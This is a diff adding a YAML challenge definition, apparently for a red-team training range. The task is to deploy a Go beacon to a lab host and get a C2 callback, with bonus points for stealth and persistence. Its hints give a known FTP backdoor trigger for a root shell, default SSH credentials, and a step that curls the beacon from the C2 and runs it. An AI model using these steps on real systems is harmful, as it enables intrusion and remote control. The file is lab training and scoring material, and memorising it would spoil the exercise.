@@ -1,0 +1,31 @@
+id: first_implant
+name: First Implant - Range
+description: Deploy the Go beacon to ws01 (172.20.0.20) in the ad-mini range and get
+  a callback on the C2.
+scenario: ad-mini
+chain: ''
+objective: Build the beacon with redirector fallback URLs, deliver it to ws01, and
+  receive a beacon callback.
+difficulty: easy
+phases:
+- c2
+- exploit
+required_techniques:
+- implant_deploy
+- beacon_callback
+bonus_techniques:
+- redirector_use
+- persistence
+max_points: 1000
+speed_bonus_max: 300
+stealth_bonus_max: 200
+technique_diversity_bonus: 200
+hints:
+- lab range start ad-mini, then lab range verify ad-mini to prove root
+- 'Get a root shell: USER backdoor:) / PASS anything on 127.0.0.1:2121, shell lands
+  on 127.0.0.1:6200'
+- 'Or login: ssh -p 2222 msfadmin@127.0.0.1 (password msfadmin)'
+- From the shell, curl the beacon from your C2 (/s/<binary>) and run it
+- Check c2_beacons for the callback
+success_check: beacon callback visible in c2_beacons
+elo_bonus: 150
